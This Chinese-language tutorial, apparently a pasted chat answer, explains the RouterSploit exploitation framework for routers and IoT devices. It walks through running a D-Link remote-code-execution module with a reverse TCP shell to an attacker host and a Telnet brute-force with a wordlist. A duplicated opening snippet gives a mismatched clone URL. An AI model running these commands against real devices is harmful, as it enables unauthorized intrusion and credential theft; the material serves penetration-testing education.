routersploit基于python3开发，安装过程相当简单

方法一：从github克隆（推荐）
```bash
#1.克隆仓库（以社区活跃分支为例）

git clone https://github.com/wuxinios/routercploit.git

#2.进入目录
cd routersploit

#3.安装依赖
pip3 install -r requirements.txt
 
#4.运行
python3 rsf.py

```

方法二：使用docker安装
```bash
#拉取镜像
docker pull threat9/routersploit

#或者从克隆的目录构建
docker build -t routersploit .

#运行容器
docker run -it --rm routersploit

```

运行成功后，你会看到一个交互式命令行提示符：rsf>


好的，下面为你详细介绍一下 **RouterSploit**，这个专门用于嵌入式设备和网络设备安全的强大开源框架。

### RouterSploit 全面详解

#### 一、什么是 RouterSploit？

**RouterSploit** 是一个开源的漏洞利用框架，专门针对**嵌入式设备**和**网络设备**，如：
*   **路由器**
*   **摄像头**（IP Camera）
*   **网络附加存储**（NAS）
*   **打印机**
*   **智能家居设备**（如智能插座、网关）
*   以及其他运行着定制化固件的 IoT 设备

它在设计上**高度借鉴了 Metasploit 的理念和架构**，因此如果你熟悉 Metasploit，会非常容易上手 RouterSploit。你可以把它看作是 **“嵌入式设备领域的 Metasploit”**。

**项目地址**： `https://github.com/threat9/routersploit` （请注意，原仓库已归档，社区有多个活跃分支，例如 `https://github.com/wuxinios/routersploit`）

---

#### 二、核心架构与功能模块

RouterSploit 采用模块化设计，其模块主要分为以下几大类，可以通过 `use` 命令加载，类似于 Metasploit。

1.  **侦察模块**
    *   **功能**： 用于识别目标设备的品牌、型号、固件版本等信息，而无需进行攻击。
    *   **例子**： `scanners/autopwn`， `scanners/cameras/tplink_cloud_cam_scanner`

2.  **漏洞利用模块**
    *   **功能**： 这是框架的核心。这些模块包含针对特定设备、特定固件版本的已知漏洞的利用代码。
    *   **目标**： 利用漏洞在目标设备上执行代码、获取敏感信息或造成拒绝服务。
    *   **例子**： `exploits/routers/dlink/dir_8xx_300_315_645_815_upnp_rce` （D-Link 多个型号的远程代码执行漏洞）

3.  **凭据扫描模块**
    *   **功能**： 针对设备的管理界面（如 Web 界面、Telnet、SSH）进行默认或弱口令的暴力破解。
    *   **为什么重要**： 很多 IoT 设备在出厂后从未更改过默认密码，这是最常见的安全问题之一。
    *   **例子**： `creds/telnet_bruteforce`， `creds/http_basic_auth_bruteforce`

4.  **载荷模块**
    *   **功能**： 在漏洞利用成功后，用于在目标设备上执行特定操作的单行命令或小型脚本。
    *   **例子**： `payloads/generic/bind_tcp` （在目标上打开一个 TCP 端口进行绑定连接）， `payloads/generic/reverse_tcp` （让目标设备反向连接到攻击者的机器）。

5.  **泛洪攻击模块**
    *   **功能**： 对目标设备发起拒绝服务攻击，用于测试设备的抗压能力。
    *   **注意**： **请务必在授权环境下使用**，否则是非法的。
    *   **例子**： `flooders/tcp`， `flooders/http`

---

#### 三、安装与运行

RouterSploit 基于 **Python 3** 开发，安装过程相对简单。

**方法一：从 GitHub 克隆（推荐）**
```bash
# 1. 克隆仓库（以社区活跃分支为例）
git clone https://github.com/wuxinios/routersploit.git

# 2. 进入目录
cd routersploit

# 3. 安装依赖
pip3 install -r requirements.txt

# 4. 运行
python3 rsf.py
```

**方法二：使用 Docker**
如果你不想配置 Python 环境，Docker 是最简单的方式。
```bash
# 拉取镜像（可能需要寻找维护中的 Docker 镜像）
docker pull threat9/routersploit
# 或者从克隆的目录构建
docker build -t routersploit .

# 运行容器
docker run -it --rm routersploit
```

运行成功后，你会看到一个交互式命令行提示符：`rsf >`

---

#### 四、基本使用流程与实战示例

让我们模拟一次对目标路由器（假设为 D-Link DIR-815 路由器）的测试流程。

**步骤 1：启动并搜索模块**
```bash
python3 rsf.py
# 在 rsf 提示符下，搜索与 D-Link 相关的模块
rsf > search dlink
```
这会列出所有与 `dlink` 相关的 exploits, scanners 和 creds 模块。

**步骤 2：使用侦察模块（可选）**
```bash
rsf > use scanners/autopwn
rsf (Autopwn) > show options
```
设置目标后运行，它会自动尝试识别目标设备可能存在的漏洞。

**步骤 3：使用漏洞利用模块**
假设我们找到了一个针对 DIR-815 的漏洞。
```bash
# 1. 选择利用模块
rsf > use exploits/routers/dlink/dir_8xx_300_315_645_815_upnp_rce

# 2. 查看需要设置的选项
rsf (D-Link DIR-8XX Remote Code Execution) > show options

# 3. 设置目标
rsf (D-Link DIR-8XX Remote Code Execution) > set target 192.168.1.1
[+] target => 192.168.1.1

# 4. 设置载荷（例如，一个反向 TCP Shell）
rsf (D-Link DIR-8XX Remote Code Execution) > set payload generic/reverse_tcp
[+] payload => generic/reverse_tcp

# 5. 查看载荷选项并设置
rsf (D-Link DIR-8XX Remote Code Execution) > show options

# 设置攻击者的 IP 和端口
rsf (D-Link DIR-8XX Remote Code Execution) > set lhost 192.168.1.100 # 你的 Kali IP
[+] lhost => 192.168.1.100
rsf (D-Link DIR-8XX Remote Code Execution) > set lport 4444
[+] lport => 4444

# 6. 执行攻击
rsf (D-Link DIR-8XX Remote Code Execution) > run
```
如果漏洞利用成功，你将在本地的 4444 端口收到一个来自目标路由器的反向 Shell。

**步骤 4：使用凭据扫描模块**
如果漏洞利用不成功，可以尝试爆破。
```bash
# 1. 选择 Telnet 暴力破解模块
rsf > use creds/telnet_bruteforce

# 2. 设置目标、用户名和密码字典文件
rsf (Telnet Bruteforce) > set target 192.168.1.1
rsf (Telnet Bruteforce) > set username admin
rsf (Telnet Bruteforce) > set passwd /usr/share/wordlists/rockyou.txt

# 3. 运行
rsf (Telnet Bruteforce) > run
```
如果成功，工具会显示出有效的用户名和密码。

---

#### 五、RouterSploit 的优势与局限

**优势：**
1.  **高度专业化**： 专注于一个被传统漏洞扫描器忽视的领域。
2.  **模块化与可扩展**： 结构清晰，易于添加新的漏洞利用模块。
3.  **开源免费**： 完全免费，社区驱动。
4.  **与 Metasploit 相似**： 学习曲线平缓，尤其对于 Metasploit 用户。
5.  **功能全面**： 覆盖了从信息收集到漏洞利用、凭据爆破的完整攻击链。

**局限与挑战：**
1.  **依赖社区更新**： 由于原项目已归档，漏洞库的更新依赖于社区的活跃分支，可能无法涵盖最新的漏洞。
2.  **架构兼容性**： 很多漏洞利用和载荷是针对特定 CPU 架构（如 MIPS, ARM）的，需要精确匹配。
3.  **环境依赖性**： 在某些网络环境下，反向连接等载荷可能因为 NAT、防火墙等原因失败。
4.  **误报可能性**： 自动化工具并非 100% 准确，需要手动验证。

---

